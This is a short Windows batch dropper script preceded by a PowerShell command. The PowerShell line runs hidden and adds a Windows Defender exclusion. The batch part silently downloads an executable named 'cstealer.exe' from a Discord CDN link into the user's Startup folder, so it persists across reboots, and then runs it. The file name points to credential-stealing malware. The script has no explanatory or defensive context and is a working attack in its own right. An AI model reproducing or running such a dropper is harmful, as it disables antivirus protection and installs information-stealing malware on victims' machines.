powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1254376648925515796/1254397005682180147/cstealer.exe?ex=667bfabf&is=667aa93f&hm=a63600accdb9c1df84dfbf544ffadb53b2e238221f33758bd6b5339057bc3c51&/cstealer.exe?download=1"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cstealer.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"